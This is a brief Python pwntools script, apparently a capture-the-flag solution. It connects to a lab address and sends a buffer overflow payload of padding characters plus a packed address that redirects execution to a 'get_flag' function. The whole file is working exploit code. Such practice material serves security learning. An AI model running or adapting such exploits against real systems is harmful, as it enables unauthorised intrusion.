#!/usr/bin/python
#coding:utf-8
#使用字母替换以拓展payload能覆盖到的地址长度
from pwn import *
io=remote('172.17.0.2',10001)
get_flag=0x08048F0D
payload='I'*21+'A'+p32(get_flag)
io.sendline(payload)
print io.recv()